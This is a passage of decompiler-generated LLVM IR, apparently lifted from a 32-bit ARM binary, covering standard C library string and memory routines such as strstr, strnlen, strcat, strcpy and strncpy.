  store i32 %v5_14c84, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_14c20, { 1, 0 }
  uselistorder i32 %v12_14c4c, { 1, 2, 0 }
  uselistorder i32 %v0_14c2054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_14c18.pr, { 0, 2, 1 }
  uselistorder i32 %v6_14c08, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_14bfc, { 1, 0 }
  uselistorder i32 %v0_14bf4, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_14c58, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_14c30, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v2_14cfc = inttoptr i32 %arg2 to i8*
  %v3_14cfc = call i32 @_memcpy(i8* %v2_14cfc, i32 %arg1)
  ret i32 %v3_14cfc
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_14d04.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_14d04 = phi i32 [ %v0_14d04.pre, %bb ], [ %v5_14d04, %bb3 ]
  %v0_14d00 = phi i32 [ %tmp, %bb ], [ %v5_14d00, %bb3 ]
  %v1_14d00 = inttoptr i32 %v0_14d00 to i8*
  %v2_14d00 = load i8, i8* %v1_14d00, align 1
  %v3_14d00 = zext i8 %v2_14d00 to i32
  store i32 %v3_14d00, i32* @r2, align 4
  %v1_14d04 = inttoptr i32 %v0_14d04 to i8*
  %v2_14d04 = load i8, i8* %v1_14d04, align 1
  %v3_14d04 = zext i8 %v2_14d04 to i32
  %v2_14d08 = icmp eq i8 %v2_14d00, 0
  br i1 %v2_14d08, label %.dec_label_pc_14d14_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_14d04 = add i32 %v0_14d04, 1
  %v5_14d00 = add i32 %v0_14d00, 1
  %v10_14d0c = icmp eq i8 %v2_14d00, %v2_14d04
  br i1 %v10_14d0c, label %entry, label %dec_label_pc_14d14

.dec_label_pc_14d14_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_14d14

dec_label_pc_14d14:                               ; preds = %bb3, %.dec_label_pc_14d14_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_14d14_crit_edge ], [ %v3_14d00, %bb3 ]
  %v2_14d14.pre-phi = sub nsw i32 %.pn, %v3_14d04
  ret i32 %v2_14d14.pre-phi

; uselistorder directives
  uselistorder i32 %v0_14d00, { 1, 0 }
  uselistorder i32 %v0_14d04, { 1, 0 }
  uselistorder label %dec_label_pc_14d14, { 1, 0 }
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_14d20 = load i32, i32* @r0, align 4
  %v1_14d20 = load i32, i32* @r1, align 4
  %v2_14d20 = inttoptr i32 %v0_14d20 to i8*
  %v3_14d20 = call i32 @_memcpy(i8* %v2_14d20, i32 %v1_14d20)
  ret i32 %v3_14d20
}

define i32 @bzero(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_14d38 = load i32, i32* @r0, align 4
  %v2_14d38 = inttoptr i32 %v0_14d38 to i8*
  %v3_14d38 = call i32 @__GI_memset(i8* %v2_14d38, i32 0)
  ret i32 %v3_14d38
}

define i32 @strstr(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_14d44 = load i8, i8* %arg2, align 1
  %v2_14d48 = icmp eq i8 %v3_14d44, 0
  %v1_14e38.pre = load i32, i32* %r0.global-to-local, align 4
  br i1 %v2_14d48, label %dec_label_pc_14e34, label %dec_label_pc_14d50

dec_label_pc_14d50:                               ; preds = %entry
  %v1_14d50 = add i32 %v1_14e38.pre, -1
  store i32 %v1_14d50, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d54

dec_label_pc_14d54:                               ; preds = %dec_label_pc_14d60, %dec_label_pc_14d50
  %v0_14d54 = phi i32 [ %v1_14d54, %dec_label_pc_14d60 ], [ %v1_14d50, %dec_label_pc_14d50 ]
  %v1_14d54 = add i32 %v0_14d54, 1
  %v2_14d54 = inttoptr i32 %v1_14d54 to i8*
  %v3_14d54 = load i8, i8* %v2_14d54, align 1
  store i32 %v1_14d54, i32* %r0.global-to-local, align 4
  %v2_14d58 = icmp eq i8 %v3_14d54, 0
  br i1 %v2_14d58, label %dec_label_pc_14e30, label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d54
  %v9_14d60 = icmp eq i8 %v3_14d54, %v3_14d44
  br i1 %v9_14d60, label %dec_label_pc_14d68, label %dec_label_pc_14d54

dec_label_pc_14d68:                               ; preds = %dec_label_pc_14d60
  %v2_14d68 = add i32 %tmp, 1
  %v3_14d68 = inttoptr i32 %v2_14d68 to i8*
  %v4_14d68 = load i8, i8* %v3_14d68, align 1
  %v2_14d6c = icmp eq i8 %v4_14d68, 0
  br i1 %v2_14d6c, label %dec_label_pc_14e34, label %dec_label_pc_14d78

dec_label_pc_14d78:                               ; preds = %dec_label_pc_14d68
  %v1_14d78 = add i32 %v0_14d54, 2
  %v1_14dcc = add i32 %tmp, 2
  %v2_14dcc = inttoptr i32 %v1_14dcc to i8*
  br label %dec_label_pc_14dc4

dec_label_pc_14d88:                               ; preds = %dec_label_pc_14e24
  %v3_14d88 = load i8, i8* %v3_14dbc.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14db4.preheader

dec_label_pc_14db4.preheader:                     ; preds = %dec_label_pc_14d88, %dec_label_pc_14dc4
  %v0_14db43.in = phi i8 [ %v3_14d88, %dec_label_pc_14d88 ], [ %v3_14dbc.pn, %dec_label_pc_14dc4 ]
  %v9_14db412 = icmp eq i8 %v0_14db43.in, %v3_14d44
  br i1 %v9_14db412, label %dec_label_pc_14dbc, label %dec_label_pc_14d94

dec_label_pc_14d94:                               ; preds = %dec_label_pc_14db4.preheader, %dec_label_pc_14db0
  %v0_14d9c = phi i32 [ %v1_14db0, %dec_label_pc_14db0 ], [ %storemerge41, %dec_label_pc_14db4.preheader ]
  %v0_14d94.in = phi i8 [ %v3_14db0, %dec_label_pc_14db0 ], [ %v0_14db43.in, %dec_label_pc_14db4.preheader ]
  %v2_14d94 = icmp eq i8 %v0_14d94.in, 0
  br i1 %v2_14d94, label %dec_label_pc_14e30, label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d94
  %v1_14d9c = add i32 %v0_14d9c, 1
  %v2_14d9c = inttoptr i32 %v1_14d9c to i8*
  %v3_14d9c = load i8, i8* %v2_14d9c, align 1
  store i32 %v1_14d9c, i32* %r0.global-to-local, align 4
  %v9_14da0 = icmp eq i8 %v3_14d9c, %v3_14d44
  br i1 %v9_14da0, label %dec_label_pc_14dbc, label %dec_label_pc_14da8

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14d9c
  %v2_14da8 = icmp eq i8 %v3_14d9c, 0
  br i1 %v2_14da8, label %dec_label_pc_14e30, label %dec_label_pc_14db0

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14da8
  %v1_14db0 = add i32 %v0_14d9c, 2
  %v2_14db0 = inttoptr i32 %v1_14db0 to i8*
  %v3_14db0 = load i8, i8* %v2_14db0, align 1
  store i32 %v1_14db0, i32* %r0.global-to-local, align 4
  %v9_14db4 = icmp eq i8 %v3_14db0, %v3_14d44
  br i1 %v9_14db4, label %dec_label_pc_14dbc, label %dec_label_pc_14d94

dec_label_pc_14dbc:                               ; preds = %dec_label_pc_14d9c, %dec_label_pc_14db0, %dec_label_pc_14db4.preheader
  %v0_14dbc = phi i32 [ %storemerge41, %dec_label_pc_14db4.preheader ], [ %v1_14d9c, %dec_label_pc_14d9c ], [ %v1_14db0, %dec_label_pc_14db0 ]
  %v1_14dbc = add i32 %v0_14dbc, 1
  br label %dec_label_pc_14dc4

dec_label_pc_14dc4:                               ; preds = %dec_label_pc_14d78, %dec_label_pc_14dbc
  %storemerge41 = phi i32 [ %v1_14dbc, %dec_label_pc_14dbc ], [ %v1_14d78, %dec_label_pc_14d78 ]
  %v3_14dbc.pn.in = inttoptr i32 %storemerge41 to i8*
  %v3_14dbc.pn = load i8, i8* %v3_14dbc.pn.in, align 1
  store i32 %storemerge41, i32* %r0.global-to-local, align 4
  %storemerge = icmp eq i8 %v3_14dbc.pn, %v4_14d68
  br i1 %storemerge, label %dec_label_pc_14dc8, label %dec_label_pc_14db4.preheader

dec_label_pc_14dc8:                               ; preds = %dec_label_pc_14dc4
  %v1_14dc8 = add i32 %storemerge41, 1
  %v2_14dc8 = inttoptr i32 %v1_14dc8 to i8*
  %v3_14dc8 = load i8, i8* %v2_14dc8, align 1
  %v4_14dc8 = zext i8 %v3_14dc8 to i32
  %v3_14dcc = load i8, i8* %v2_14dcc, align 1
  %v4_14dcc = zext i8 %v3_14dcc to i32
  %v9_14dd4 = icmp eq i8 %v3_14dc8, %v3_14dcc
  %v1_14ddc = add i32 %storemerge41, -1
  store i32 %v1_14ddc, i32* %r0.global-to-local, align 4
  br i1 %v9_14dd4, label %dec_label_pc_14de4, label %dec_label_pc_14e24

dec_label_pc_14de4:                               ; preds = %dec_label_pc_14dc8, %dec_label_pc_14e14
  %v0_14dfc = phi i32 [ %v1_14e04, %dec_label_pc_14e14 ], [ %v1_14dcc, %dec_label_pc_14dc8 ]
  %v0_14df4 = phi i32 [ %v1_14e00, %dec_label_pc_14e14 ], [ %v1_14dc8, %dec_label_pc_14dc8 ]
  %v0_14de4 = phi i32 [ %v4_14e14, %dec_label_pc_14e14 ], [ %v4_14dc8, %dec_label_pc_14dc8 ]
  %v2_14de4 = icmp eq i32 %v0_14de4, 0
  br i1 %v2_14de4, label %dec_label_pc_14e34, label %dec_label_pc_14dec

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14de4
  %v1_14dec = add i32 %v0_14df4, 1
  %v2_14dec = inttoptr i32 %v1_14dec to i8*
  %v3_14dec = load i8, i8* %v2_14dec, align 1
  %v1_14df0 = add i32 %v0_14dfc, 1
  %v2_14df0 = inttoptr i32 %v1_14df0 to i8*
  %v3_14df0 = load i8, i8* %v2_14df0, align 1
  %v4_14df0 = zext i8 %v3_14df0 to i32
  store i32 %v1_14dec, i32* @r1, align 4
  %v9_14df8 = icmp eq i8 %v3_14dec, %v3_14df0
  %v1_14e00 = add i32 %v0_14df4, 2
  %v1_14e04 = add i32 %v0_14dfc, 2
  br i1 %v9_14df8, label %dec_label_pc_14e0c, label %dec_label_pc_14e24

dec_label_pc_14e0c:                               ; preds = %dec_label_pc_14dec
  %v2_14e0c = icmp eq i8 %v3_14dec, 0
  br i1 %v2_14e0c, label %dec_label_pc_14e34, label %dec_label_pc_14e14

dec_label_pc_14e14:                               ; preds = %dec_label_pc_14e0c
  %v2_14e14 = inttoptr i32 %v1_14e04 to i8*
  %v3_14e14 = load i8, i8* %v2_14e14, align 1
  %v4_14e14 = zext i8 %v3_14e14 to i32
  %v2_14e18 = inttoptr i32 %v1_14e00 to i8*
  %v3_14e18 = load i8, i8* %v2_14e18, align 1
  %v9_14e1c = icmp eq i8 %v3_14e18, %v3_14e14
  br i1 %v9_14e1c, label %dec_label_pc_14de4, label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14e14, %dec_label_pc_14dec, %dec_label_pc_14dc8
  %v0_14e24 = phi i32 [ %v4_14dcc, %dec_label_pc_14dc8 ], [ %v4_14e14, %dec_label_pc_14e14 ], [ %v4_14df0, %dec_label_pc_14dec ]
  %v2_14e24 = icmp eq i32 %v0_14e24, 0
  br i1 %v2_14e24, label %dec_label_pc_14e34, label %dec_label_pc_14d88

dec_label_pc_14e30:                               ; preds = %dec_label_pc_14d54, %dec_label_pc_14da8, %dec_label_pc_14d94
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14e34

dec_label_pc_14e34:                               ; preds = %dec_label_pc_14e24, %dec_label_pc_14e0c, %dec_label_pc_14de4, %entry, %dec_label_pc_14d68, %dec_label_pc_14e30
  %v1_14e38 = phi i32 [ %v1_14d54, %dec_label_pc_14d68 ], [ 0, %dec_label_pc_14e30 ], [ %v1_14e38.pre, %entry ], [ %v1_14ddc, %dec_label_pc_14de4 ], [ %v1_14ddc, %dec_label_pc_14e0c ], [ %v1_14ddc, %dec_label_pc_14e24 ]
  ret i32 %v1_14e38

; uselistorder directives
  uselistorder i32 %v1_14e00, { 1, 0 }
  uselistorder i8 %v3_14dbc.pn, { 1, 0 }
  uselistorder i8* %v3_14dbc.pn.in, { 1, 0 }
  uselistorder i32 %storemerge41, { 3, 2, 6, 1, 4, 0, 5 }
  uselistorder i8 %v3_14db0, { 1, 0 }
  uselistorder i32 %v1_14db0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_14d54, { 0, 2, 3, 1 }
  uselistorder i8 %v3_14d44, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 2, 6, 7, 4, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_14e34, { 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_14e30, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14de4, { 1, 0 }
  uselistorder label %dec_label_pc_14dc4, { 1, 0 }
  uselistorder label %dec_label_pc_14dbc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14d94, { 1, 0 }
  uselistorder label %dec_label_pc_14db4.preheader, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_14e3c = icmp eq i32 %arg2, 0
  br i1 %v2_14e3c, label %bb, label %dec_label_pc_14e50

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_14e50:                               ; preds = %entry
  %v2_14e50 = add i32 %tmp, %arg2
  %v3_14e50 = icmp ult i32 %v2_14e50, %tmp
  br i1 %v3_14e50, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_14e50
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14e50, %bb19
  %v5_14ef0 = phi i32 [ %v2_14e50, %dec_label_pc_14e50 ], [ -1, %bb19 ]
  %v1_14e704 = urem i32 %tmp, 4
  %v2_14e705 = icmp eq i32 %v1_14e704, 0
  br i1 %v2_14e705, label %dec_label_pc_14e78, label %dec_label_pc_14e60

dec_label_pc_14e60:                               ; preds = %bb20, %dec_label_pc_14e6c
  %v0_14e6c = phi i32 [ %v1_14e6c, %dec_label_pc_14e6c ], [ %tmp, %bb20 ]
  %v1_14e60 = inttoptr i32 %v0_14e6c to i8*
  %v2_14e60 = load i8, i8* %v1_14e60, align 1
  %v2_14e64 = icmp eq i8 %v2_14e60, 0
  br i1 %v2_14e64, label %dec_label_pc_14eec, label %dec_label_pc_14e6c

dec_label_pc_14e6c:                               ; preds = %dec_label_pc_14e60
  %v1_14e6c = add i32 %v0_14e6c, 1
  %v1_14e70 = urem i32 %v1_14e6c, 4
  %v2_14e70 = icmp eq i32 %v1_14e70, 0
  br i1 %v2_14e70, label %dec_label_pc_14e78, label %dec_label_pc_14e60

dec_label_pc_14e78:                               ; preds = %dec_label_pc_14e6c, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_14e6c, %dec_label_pc_14e6c ]
  %v3_14edc30 = icmp ult i32 %storemerge.lcssa, %v5_14ef0
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_14edc30, label %dec_label_pc_14e80, label %dec_label_pc_14eec

dec_label_pc_14e80:                               ; preds = %dec_label_pc_14ed8, %dec_label_pc_14e78
  %v0_14ed037 = phi i32 [ %v4_14e80, %dec_label_pc_14ed8 ], [ %storemerge.lcssa, %dec_label_pc_14e78 ]
  %v1_14e80 = inttoptr i32 %v0_14ed037 to i32*
  %v2_14e80 = load i32, i32* %v1_14e80, align 4
  %v4_14e80 = add i32 %v0_14ed037, 4
  %v2_14e84 = add i32 %v2_14e80, -16843009
  %v2_14e88 = and i32 %v2_14e84, -2139062144
  store i32 %v2_14e88, i32* @ip, align 4
  %v2_14e8c = icmp eq i32 %v2_14e88, 0
  br i1 %v2_14e8c, label %dec_label_pc_14ed8, label %dec_label_pc_14e94

dec_label_pc_14e94:                               ; preds = %dec_label_pc_14e80
  %v2_14e94 = inttoptr i32 %v0_14ed037 to i8*
  %v3_14e94 = load i8, i8* %v2_14e94, align 1
  %v2_14e98 = icmp eq i8 %v3_14e94, 0
  br i1 %v2_14e98, label %bb21, label %dec_label_pc_14ea8

bb21:                                             ; preds = %dec_label_pc_14e94
  br label %dec_label_pc_14eec

dec_label_pc_14ea8:                               ; preds = %dec_label_pc_14e94
  %v1_14ea8 = add i32 %v0_14ed037, 1
  %v2_14ea8 = inttoptr i32 %v1_14ea8 to i8*
  %v3_14ea8 = load i8, i8* %v2_14ea8, align 1
  %v2_14eac = icmp eq i8 %v3_14ea8, 0
  br i1 %v2_14eac, label %dec_label_pc_14eec, label %dec_label_pc_14eb8

dec_label_pc_14eb8:                               ; preds = %dec_label_pc_14ea8
  %v1_14eb8 = add i32 %v0_14ed037, 2
  %v2_14eb8 = inttoptr i32 %v1_14eb8 to i8*
  %v3_14eb8 = load i8, i8* %v2_14eb8, align 1
  %v2_14ebc = icmp eq i8 %v3_14eb8, 0
  br i1 %v2_14ebc, label %dec_label_pc_14eec, label %dec_label_pc_14ec8

dec_label_pc_14ec8:                               ; preds = %dec_label_pc_14eb8
  %v1_14ec8 = add i32 %v0_14ed037, 3
  %v2_14ec8 = inttoptr i32 %v1_14ec8 to i8*
  %v3_14ec8 = load i8, i8* %v2_14ec8, align 1
  %v2_14ecc = icmp eq i8 %v3_14ec8, 0
  br i1 %v2_14ecc, label %dec_label_pc_14eec, label %dec_label_pc_14ed8

dec_label_pc_14ed8:                               ; preds = %dec_label_pc_14ec8, %dec_label_pc_14e80
  %v3_14edc = icmp ult i32 %v4_14e80, %v5_14ef0
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_14edc, label %dec_label_pc_14e80, label %dec_label_pc_14eec

dec_label_pc_14eec:                               ; preds = %dec_label_pc_14ed8, %dec_label_pc_14e78, %dec_label_pc_14e60, %dec_label_pc_14ea8, %dec_label_pc_14eb8, %dec_label_pc_14ec8, %bb21
  %v1_14eec = phi i32 [ %v0_14ed037, %bb21 ], [ %storemerge.lcssa, %dec_label_pc_14e78 ], [ %v1_14ea8, %dec_label_pc_14ea8 ], [ %v1_14eb8, %dec_label_pc_14eb8 ], [ %v1_14ec8, %dec_label_pc_14ec8 ], [ %v5_14ef0, %dec_label_pc_14ed8 ], [ %v0_14e6c, %dec_label_pc_14e60 ]
  %v3_14eec = icmp uge i32 %v5_14ef0, %v1_14eec
  %v9_14eec = icmp eq i32 %v5_14ef0, %v1_14eec
  %v2_14ef0 = xor i1 %v3_14eec, true
  %v3_14ef0 = or i1 %v9_14eec, %v2_14ef0
  br i1 %v3_14ef0, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_14eec
  %v6_14ef0 = sub i32 %v5_14ef0, %tmp
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_14eec, %bb22
  %v5_14ef4 = phi i32 [ %v1_14eec, %dec_label_pc_14eec ], [ %v6_14ef0, %bb22 ]
  %v2_14ef4 = xor i1 %v9_14eec, true
  %v3_14ef4 = and i1 %v3_14eec, %v2_14ef4
  br i1 %v3_14ef4, label %bb24, label %bb25

bb24:                                             ; preds = %bb23
  %v6_14ef4 = sub i32 %v5_14ef4, %tmp
  br label %bb25

bb25:                                             ; preds = %bb, %bb23, %bb24
  %v1_14efc = phi i32 [ 0, %bb ], [ %v5_14ef4, %bb23 ], [ %v6_14ef4, %bb24 ]
  ret i32 %v1_14efc

; uselistorder directives
  uselistorder i1 %v3_14eec, { 1, 0 }
  uselistorder i32 %v4_14e80, { 1, 0 }
  uselistorder i32 %v0_14ed037, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_14e6c, { 1, 0, 2 }
  uselistorder i32 %v5_14ef0, { 3, 4, 5, 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 3, 5, 6, 0, 4 }
  uselistorder i32 -2139062144, { 2, 1, 0 }
  uselistorder label %bb25, { 2, 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_14eec, { 0, 5, 4, 3, 6, 1, 2 }
  uselistorder label %dec_label_pc_14e60, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @strcat(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14f0c

dec_label_pc_14f0c:                               ; preds = %dec_label_pc_14f0c, %entry
  %v0_14f0c = phi i32 [ %v5_14f0c, %dec_label_pc_14f0c ], [ %tmp, %entry ]
  %v1_14f0c = inttoptr i32 %v0_14f0c to i8*
  %v2_14f0c = load i8, i8* %v1_14f0c, align 1
  %v5_14f0c = add i32 %v0_14f0c, 1
  store i32 %v5_14f0c, i32* %r2.global-to-local, align 4
  %v2_14f10 = icmp eq i8 %v2_14f0c, 0
  store i1 %v2_14f10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14f10, label %dec_label_pc_14f18, label %dec_label_pc_14f0c

dec_label_pc_14f18:                               ; preds = %dec_label_pc_14f0c
  %v1_14f18 = add i32 %v0_14f0c, -1
  store i32 %v1_14f18, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14f1c

dec_label_pc_14f1c:                               ; preds = %dec_label_pc_14f1c, %dec_label_pc_14f18
  %v2_14f24 = phi i32 [ %v6_14f24, %dec_label_pc_14f1c ], [ %v1_14f18, %dec_label_pc_14f18 ]
  %v0_14f1c = load i32, i32* @r1, align 4
  %v1_14f1c = inttoptr i32 %v0_14f1c to i8*
  %v2_14f1c = load i8, i8* %v1_14f1c, align 1
  %v5_14f1c = add i32 %v0_14f1c, 1
  store i32 %v5_14f1c, i32* @r1, align 4
  %v2_14f20 = icmp eq i8 %v2_14f1c, 0
  store i1 %v2_14f20, i1* %cpsr_z.global-to-local, align 1
  %v3_14f24 = add i32 %v2_14f24, 1
  %v4_14f24 = inttoptr i32 %v3_14f24 to i8*
  store i8 %v2_14f1c, i8* %v4_14f24, align 1
  %v5_14f24 = load i32, i32* %r2.global-to-local, align 4
  %v6_14f24 = add i32 %v5_14f24, 1
  store i32 %v6_14f24, i32* %r2.global-to-local, align 4
  %v0_14f28 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f28, label %dec_label_pc_14f2c, label %dec_label_pc_14f1c

dec_label_pc_14f2c:                               ; preds = %dec_label_pc_14f1c
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_14f24, { 1, 0 }
  uselistorder i32 %v5_14f0c, { 1, 0 }
  uselistorder i32 %v0_14f0c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_14f401 = load i32, i32* @r1, align 4
  %v1_14f402 = inttoptr i32 %v0_14f401 to i8*
  %v2_14f403 = load i8, i8* %v1_14f402, align 1
  %v2_14f445 = icmp eq i8 %v2_14f403, 0
  store i1 %v2_14f445, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_14f403, i8* %arg1, align 1
  br i1 %v2_14f445, label %dec_label_pc_14f50, label %dec_label_pc_14f38

dec_label_pc_14f38:                               ; preds = %entry, %dec_label_pc_14f38
  %v0_14f38 = load i32, i32* @r1, align 4
  %v1_14f38 = add i32 %v0_14f38, 1
  store i32 %v1_14f38, i32* @r1, align 4
  %v0_14f3c = load i32, i32* %r2.global-to-local, align 4
  %v1_14f3c = add i32 %v0_14f3c, 1
  store i32 %v1_14f3c, i32* %r2.global-to-local, align 4
  %v1_14f40 = inttoptr i32 %v1_14f38 to i8*
  %v2_14f40 = load i8, i8* %v1_14f40, align 1
  %v2_14f44 = icmp eq i8 %v2_14f40, 0
  store i1 %v2_14f44, i1* %cpsr_z.global-to-local, align 1
  %v3_14f48 = inttoptr i32 %v1_14f3c to i8*
  store i8 %v2_14f40, i8* %v3_14f48, align 1
  %v0_14f4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f4c, label %dec_label_pc_14f50, label %dec_label_pc_14f38

dec_label_pc_14f50:                               ; preds = %dec_label_pc_14f38, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14f38, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_14f54 = icmp eq i32 %arg2, 3
  store i1 %v7_14f54, i1* %cpsr_z.global-to-local, align 1
  %v0_14f58 = load i32, i32* @lr, align 4
  store i32 %v0_14f58, i32* %stack_var_-4, align 4
  %v1_14f5c = add i32 %arg1, -1
  store i32 %v1_14f5c, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_14fd8, label %dec_label_pc_14f64

dec_label_pc_14f64:                               ; preds = %entry
  %v3_14f64 = udiv i32 %arg2, 4
  store i32 %v3_14f64, i32* %lr.global-to-local, align 4
  %v0_14f68.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_14f68

dec_label_pc_14f68:                               ; preds = %dec_label_pc_14fb4, %dec_label_pc_14f64
  %v2_14f70 = phi i32 [ %v6_14fa8, %dec_label_pc_14fb4 ], [ %v1_14f5c, %dec_label_pc_14f64 ]
  %v0_14f68 = phi i32 [ %v1_14fb8, %dec_label_pc_14fb4 ], [ %v0_14f68.pre, %dec_label_pc_14f64 ]
  %v1_14f68 = inttoptr i32 %v0_14f68 to i8*
  %v2_14f68 = load i8, i8* %v1_14f68, align 1
  %v3_14f68 = zext i8 %v2_14f68 to i32
  store i32 %v3_14f68, i32* %r3.global-to-local, align 4
  %v2_14f6c = icmp eq i8 %v2_14f68, 0
  store i1 %v2_14f6c, i1* %cpsr_z.global-to-local, align 1
  %v3_14f70 = add i32 %v2_14f70, 1
  %v4_14f70 = inttoptr i32 %v3_14f70 to i8*
  store i8 %v2_14f68, i8* %v4_14f70, align 1
  %v5_14f70 = load i32, i32* @ip, align 4
  %v6_14f70 = add i32 %v5_14f70, 1
  store i32 %v6_14f70, i32* @ip, align 4
  %v0_14f74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f74, label %dec_label_pc_14fc4, label %dec_label_pc_14f78

dec_label_pc_14f78:                               ; preds = %dec_label_pc_14f68
  %v0_14f78 = load i32, i32* @r1, align 4
  %v1_14f78 = add i32 %v0_14f78, 1
  %v2_14f78 = inttoptr i32 %v1_14f78 to i8*
  %v3_14f78 = load i8, i8* %v2_14f78, align 1
  %v4_14f78 = zext i8 %v3_14f78 to i32
  store i32 %v4_14f78, i32* %r3.global-to-local, align 4
  %v2_14f7c = icmp eq i8 %v3_14f78, 0
  store i1 %v2_14f7c, i1* %cpsr_z.global-to-local, align 1
  %v3_14f80 = add i32 %v5_14f70, 2
  %v4_14f80 = inttoptr i32 %v3_14f80 to i8*
  store i8 %v3_14f78, i8* %v4_14f80, align 1
  %v5_14f80 = load i32, i32* @ip, align 4
  %v6_14f80 = add i32 %v5_14f80, 1
  store i32 %v6_14f80, i32* @ip, align 4
  %v0_14f84 = load i32, i32* @r1, align 4
  %v1_14f84 = add i32 %v0_14f84, 1
  store i32 %v1_14f84, i32* %r1.global-to-local, align 4
  %v0_14f88 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14f88, label %dec_label_pc_14fc4, label %dec_label_pc_14f8c

dec_label_pc_14f8c:                               ; preds = %dec_label_pc_14f78
  %v1_14f8c = add i32 %v0_14f84, 2
  %v2_14f8c = inttoptr i32 %v1_14f8c to i8*
  %v3_14f8c = load i8, i8* %v2_14f8c, align 1
  %v4_14f8c = zext i8 %v3_14f8c to i32
  store i32 %v4_14f8c, i32* %r3.global-to-local, align 4
  %v2_14f90 = icmp eq i8 %v3_14f8c, 0
